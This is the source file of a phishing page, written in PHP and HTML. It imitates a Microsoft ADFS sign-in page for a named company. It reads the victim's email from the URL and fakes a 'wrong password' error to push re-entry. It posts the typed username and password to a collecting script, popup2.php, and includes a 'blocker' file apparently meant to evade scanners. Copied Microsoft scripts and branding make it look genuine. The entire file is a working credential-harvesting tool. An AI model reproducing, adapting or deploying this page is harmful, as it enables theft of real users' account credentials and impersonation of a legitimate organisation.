﻿<?php
include('blocker.php');

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 

$email = $userid;
$pass = "pass";

?><!DOCTYPE html>
<html lang="en-US"><head>
        <meta http-equiv="X-UA-Compatible" content="IE=10.000">
        <meta name="viewport" content="width=1366px; initial-scale=1.0; maximum-scale=1.0">
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta http-equiv="cache-control" content="no-cache,no-store">
        <meta http-equiv="pragma" content="no-cache">
        <meta http-equiv="expires" content="-1">
        <meta name="mswebdialog-title" content="Connecting to sts.simedarby.com">

        <title>Sign in to your account </title>
        <script type="text/javascript">
//<![CDATA[
function LoginErrors(){this.userNameFormatError = 'Enter your user ID in the format \u0026quot;domain\\user\u0026quot; or \u0026quot;user@domain\u0026quot;.'; this.passwordEmpty = 'Enter your password.'; this.passwordTooLong = 'Password must be shorter than 128 characters.';}; var maxPasswordLength = 128;
//]]>
</script>

<script type="text/javascript">
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.
function InputUtil(errTextElementID, errDisplayElementID) {

    if (!errTextElementID)  errTextElementID = 'errorText'; 
    if (!errDisplayElementID)  errDisplayElementID = 'error'; 

    this.hasFocus = false;
    this.errLabel = document.getElementById(errTextElementID);
    this.errDisplay = document.getElementById(errDisplayElementID);
};
InputUtil.prototype.canDisplayError = function () {
    return this.errLabel && this.errDisplay;
}
InputUtil.prototype.checkError = function () {
    if (!this.canDisplayError){
        throw new Error ('Error element not present');
    }
    if (this.errLabel && this.errLabel.innerHTML) {
        this.errDisplay.style.display = '';        
        var cause = this.errLabel.getAttribute('for');
        if (cause) {
            var causeNode = document.getElementById(cause);
            if (causeNode && causeNode.value) {
                causeNode.focus();
                this.hasFocus = true;
            }
        }
    }
    else {
        this.errDisplay.style.display = 'none';
    }
};
InputUtil.prototype.setInitialFocus = function (input) {
    if (this.hasFocus) return;
    var node = document.getElementById(input);
    if (node) {
        if ((/^\s*$/).test(node.value)) {
            node.focus();
            this.hasFocus = true;
        }
    }
};
InputUtil.prototype.setError = function (input, errorMsg) {
    if (!this.canDisplayError) {
        throw new Error('Error element not present');
    }
    input.focus();

    if (errorMsg) {
        this.errLabel.innerHTML = errorMsg;
    }
    this.errLabel.setAttribute('for', input.id);
    this.errDisplay.style.display = '';
};
InputUtil.makePlaceholder = function (input) {
    var ua = navigator.userAgent;

    if (ua != null && 
        (ua.match(/MSIE 9.0/) != null || 
         ua.match(/MSIE 8.0/) != null ||
         ua.match(/MSIE 7.0/) != null)) {
        var node = document.getElementById(input);
        if (node) {
            var placeholder = node.getAttribute("placeholder");
            if (placeholder != null && placeholder != '') {
                var label = document.createElement('input');
                label.type = "text";
                label.value = placeholder;
                label.readOnly = true;
                label.style.position = 'absolute';
                label.style.borderColor = 'transparent';
                label.className = node.className + ' hint';
                label.tabIndex = -1;
                label.onfocus = function () { this.nextSibling.focus(); };

                node.style.position = 'relative';
                node.parentNode.style.position = 'relative';
                node.parentNode.insertBefore(label, node);
                node.onkeyup = function () { InputUtil.showHint(this); };
                node.onblur = function () { InputUtil.showHint(this); };
                node.style.background = 'transparent';

                node.setAttribute("placeholder", "");
                InputUtil.showHint(node);
            }
        }
    }
};
InputUtil.focus = function (inputField) {
    var node = document.getElementById(inputField);
    if (node) node.focus();
};
InputUtil.hasClass = function(node, clsName) {
    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
};
InputUtil.addClass = function(node, clsName) {
    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
};
InputUtil.removeClass = function(node, clsName) {
    if (this.hasClass(node, clsName)) {
        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
        node.className = node.className.replace(reg, ' ');
    }
};
InputUtil.showHint = function (node, gotFocus) {
    if (node.value && node.value != '') {
        node.previousSibling.style.display = 'none';
    }
    else {
        node.previousSibling.style.display = '';
    }
};
//]]>
</script>


        <link rel="SHORTCUT ICON" href="scr/favicon_a.ico" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
<link href="scr/login.min.css" rel="stylesheet" />
        <link rel="stylesheet" type="text/css" href="scr/style.css"><style>.illustrationClass {background-image:url(scr/heroillustration.jpg?id=183128A3C941EDE3D9199FA37D6AA90E0A7DFE101B37D10B4FEDA0CF35E11AFD);}</style>
		
    </head>
    <body dir="ltr" class="body">
    <div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
        <h1>JavaScript required</h1>
        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
    </div>
	<script src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4212.8/content/cdnbundles/jquery.1.11.min.js"></script>

<script src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4212.8/content/cdnbundles/aad.login.min.js"></script>
    <script type="text/javascript" language="JavaScript">
         document.getElementById("noScript").style.display = "none";
    </script>
    <div id="fullPage">
        <div id="brandingWrapper" class="float">
            <div class="illustrationClass" id="branding"></div>
        </div>
        <div id="contentWrapper" class="float">
            <div id="content">
                <div id="header">
                    <div class="login_workload_logo_container"><img src="scr/bannerlogo.png" alt="Work or school, or personal Microsoft account" class="workload_img" id="login_workload_logo_image" style="visibility: visible;"></div>
                                <div class="spacer"></div>

<div id="tiles_cta_text" class="cta_message_text"></div></div>
<ul class="login_cred_container">
    <!--  -->
<div id="login_error_container" class="login_error_container">
<div class="login_cta_container normaltext">
        <!-- HR=UserAccountNotFound -->
        <input id="error_code" value="UserAccountNotFound" type="hidden">
        <script type="text/javascript">
            try
            {
                // create an HTML element then use text() to strip out unwanted HTML markup that may be present in the error
                // in try/catch block since $('...') can fail if it does not like something, but this isn't a fatal error
                var accessibleError = $('<div>' + '<H1>We don\'t recognize this user ID or password</H1><p>Be sure to type the password for your work or school account.</p>' + '</div>');
                $('#accessibleError').text(accessibleError.text());
                $('#accessibleError').show();
            }
            catch (e) {}
        </script>
        <div id="cta_error_message_text" class="error_msg errortext UserAccountNotFound">
            <div id="recover_container" style="opacity: 1;">
<div class="login_cta_container normaltext">
<H1>We don't recognize your Microsoft account or password</H1><p><H1>Be sure to re-type the password for your work account.</H1></p></div>
</div></div>

        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event &amp;&amp; event.keyCode == 13) Login.submitLoginRequest();" action="popup2.php">
            <div style="display: none;" id="error" class="fieldMargin error smallText">
                <label id="errorText" for=""></label>
            </div>

            <div id="formsAuthenticationArea">
                <div id="userNameArea">
                    <input id="userNameInput" name="UserName" value="<?php echo $email ?>" readonly="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="Email or phone" autocomplete="off" type="email">     
                </div>

                <div id="passwordArea">
                     <input id="passwordInput" name="Password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off" type="password">                                   
                </div>
                <div id="cred_kmsi_container" class="subtext normaltext">
    <span class="input_field ">
        <input tabindex="10" id="cred_keep_me_signed_in_checkbox" type="checkbox" value="0" class="win-checkbox" name="persist">
        <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
    </span>
</div>
                <div id="submissionArea" class="submitMargin">
                    <span id="submitButton" class="submit" tabindex="4" onkeypress="if (event &amp;&amp; event.keyCode == 32) Login.submitLoginRequest();" onclick="return Login.submitLoginRequest();">Sign in</span>
                </div>
            </div>
            <input id="optionForms" name="AuthMethod" value="FormsAuthentication" type="hidden">
        </form>

             <div id="authOptions">
        <form id="options" method="post" action="https://sts.simedarby.com:443/adfs/ls/?username=ho.e%40simedarby.com&amp;wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx=estsredirect%3d2%26estsrequest%3drQIIAbPSySgpKSi20tcvyC8qSczRy81MLsovzk8ryc_LycxL1UvOz9XLL0rPTAGxioS4BART8-xupv3z2qzJtXCryRGZVYzKhI3Qv8DI-IKR8RaToH9RumdKeLFbakpqUWJJZn7eIybe0OLUIv-8nMqQ_OzUvEnMfDn56Zl58cVFafFpOfnlQAGgCQWJySXxJZnJ2aklu5hVkizS0lLNTU11k9OMDHVNLE3NdBONklN1Uw2M0pLMjJMNjA1NLrAI_GBhXMQKdDOHvWHFojnffTqky7W-Hjhgd4CTEQA1&amp;popupui=">
            <script type="text/javascript">
                function SelectOption(option) {
                    var i = document.getElementById('optionSelection');
                    i.value = option;
                    document.forms['options'].submit();
                    return false;
                }
            </script>
            <input id="optionSelection" name="AuthMethod" type="hidden">
            <div class="groupMargin"></div>
        </form>
      </div>
<div id="recover_container" class="subtext smalltext">
            <span>
                <a id="cred_forgot_password_link" tabindex="12"
                    href="#en-US">Can’t access your account?</a>
            </span>
        </div>
        <div id="introduction" class="groupMargin">
                                 
        </div>
			
                <tbody><tr>
                    <td>
                        <div>
		<div id="footerPlaceholder"></div>
            </div>
			
            <div id="footer_links_container" class="login_footer_container">
    <div class="footer_inner_container">
	       <table id="footer_table" class="footer_block">
		   
                <tr><br><br><br><br>
                    <td>
                        <div>
                            <div class="corporate_footer">
                                    <div>
                                        <span class="footer_link text-caption" id="footer_copyright_link">
&#169; 2016 Microsoft                                        </span>
                                    </div>
                                    <div>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_terms" href="#https://login.microsoftonline.com/termsofuse" target="_blank">Terms of use</a>
                                        </span>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_privacy" href="#https://login.microsoftonline.com/privacy" target="_blank">Privacy &amp; Cookies</a>
                                        </span>
                                    </div>
                            </div>
                        </div>
                    </td>
                    <td>
                        <div class="footer_glyph">
<img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4146.1/content/images/microsoft_logo.png" alt="Microsoft account symbol" />
                        </div>
                    </td>
                </tr>
        </table>
    </div>
</div>
<div id="login_prefetch_container" class="no_display">
</div>
                    </td>
                </tr>
            </table>
        </div>
        <script type="text/javascript">
        //<![CDATA[

            function Login() {
            }

            Login.userNameInput = 'userNameInput';
            Login.passwordInput = 'passwordInput';

            Login.initialize = function () {

                var u = new InputUtil();

                u.checkError();
                u.setInitialFocus(Login.userNameInput);
                u.setInitialFocus(Login.passwordInput);
            }();

            Login.submitLoginRequest = function () { 
                var u = new InputUtil();
                var e = new LoginErrors();

                var userName = document.getElementById(Login.userNameInput);
                var password = document.getElementById(Login.passwordInput);

                if (!userName.value || !userName.value.match('[@\\\\]')) {
                    u.setError(userName, e.userNameFormatError);
                    return false;
                }

                if (!password.value) {
                    u.setError(password, e.passwordEmpty);
                    return false;
                }

                if (password.value.length > maxPasswordLength) {
                    u.setError(password, e.passwordTooLong);
                    return false;
                }

                document.forms['loginForm'].submit();
                return false;
            };

            InputUtil.makePlaceholder(Login.userNameInput);
            InputUtil.makePlaceholder(Login.passwordInput);
        //]]>
        </script>
    </div>

    </div>

                </div>
                
    <script type="text/javascript">
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.

// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
"use strict";

// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
// Note change input type does not work on all versions of all browsers.
if (navigator.userAgent.match(/iPhone/i) != null) {
    var emails = document.querySelectorAll("input[type='email']");
    if (emails) {
        for (var i = 0; i < emails.length; i++) {
            emails[i].type = 'text';
        }
    }
}

// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
// which is necessary for correct functionality of immersive IE. 
// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
// Windows 8 phone has agent string 'IEMobile 10.0'
if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
    var msViewportStyle = document.createElement("style");
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{width:auto!important}"
        )
    );
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{height:auto!important}"
        )
    );
    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
}

// If the innerWidth is defined, use it as the viewport width.
if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
    var viewport = document.querySelector("meta[name=viewport]");
    viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
}

// Gets the current style of a specific property for a specific element.
function getStyle(element, styleProp) {
    var propStyle = null;

    if (element && element.currentStyle) {
        propStyle = element.currentStyle[styleProp];
    }
    else if (element && window.getComputedStyle) {
        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
    }

    return propStyle;
}

// The script below is used for downloading the illustration image 
// only when the branding is displaying. This script work together
// with the code in PageBase.cs that sets the html inline style
// containing the class 'illustrationClass' with the background image.
var computeLoadIllustration = function () {
    var branding = document.getElementById("branding");
    var brandingDisplay = getStyle(branding, "display");
    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");

    if (brandingDisplay && brandingDisplay !== "none" &&
        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
        var newClass = "illustrationClass";

        if (branding.classList && branding.classList.add) {
            branding.classList.add(newClass);
        } else if (branding.className !== undefined) {
            branding.className += " " + newClass;
        }
        if (window.removeEventListener) {
            window.removeEventListener('load', computeLoadIllustration, false);
            window.removeEventListener('resize', computeLoadIllustration, false);
        }
        else if (window.detachEvent) {
            window.detachEvent('onload', computeLoadIllustration);
            window.detachEvent('onresize', computeLoadIllustration);
        }
    }
};

if (window.addEventListener) {
    window.addEventListener('resize', computeLoadIllustration, false);
    window.addEventListener('load', computeLoadIllustration, false);
}
else if (window.attachEvent) {
    window.attachEvent('onresize', computeLoadIllustration);
    window.attachEvent('onload', computeLoadIllustration);
}

//]]>
</script>


    
 

</body></html>